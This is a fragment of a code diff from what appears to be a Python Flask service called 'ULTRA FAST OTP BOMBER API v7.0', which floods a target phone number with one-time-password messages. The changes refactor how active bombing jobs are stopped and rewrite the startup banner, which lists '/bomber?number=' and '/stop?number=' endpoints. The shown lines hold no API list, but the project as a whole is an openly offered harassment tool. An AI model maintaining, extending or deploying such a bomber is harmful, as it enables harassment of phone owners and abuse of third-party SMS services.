-        duration = round(time.time() - self.active_bombings[phone_key]["start_time"], 2)
+        duration = round(time.time() - bomb["start_time"], 2)
         
         return {
             "status": "stopped",
@@ -2007,7 +1472,14 @@ class UltraFastBomber:
         stopped = []
         for key, bomb in list(self.active_bombings.items()):
             if bomb["running"]:
-                bomb["stop_event"].set()
+                holder = bomb.get("stop_event_holder", {})
+                stop_event = holder.get("event")
+                loop = holder.get("loop")
+                if stop_event and loop:
+                    try:
+                        loop.call_soon_threadsafe(stop_event.set)
+                    except Exception:
+                        pass
                 bomb["running"] = False
                 phone = key.replace("bomb_", "")
                 stopped.append(phone)
@@ -2096,20 +1568,19 @@ def status():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     
-    print("""
+    print(f"""
     ╔══════════════════════════════════════════════════════════════════╗
     ║                                                                  ║
     ║   🔥 ULTRA FAST OTP BOMBER API v7.0                            ║
-    ║   📦 Deployed on Render.com                                    ║
     ║                                                                  ║
-    ║   📦 Total APIs: {}                                       ║
+    ║   📦 Total APIs: {bomber.total_apis}                                       ║
     ║   🔄 Mode: ULTRA FAST - MAXIMUM SPEED                        ║
     ║                                                                  ║
-    ║   🚀 Server: http://0.0.0.0:{}                            ║
+    ║   🚀 Server: http://0.0.0.0:{port}                            ║
     ║   📡 Start: /bomber?number=9876543210                        ║
     ║   🛑 Stop: /stop?number=9876543210                           ║
     ║                                                                  ║
     ╚══════════════════════════════════════════════════════════════════╝
-    """.format(bomber.total_apis, port))
+    """)
     
     app.run(host='0.0.0.0', port=port, debug=False)
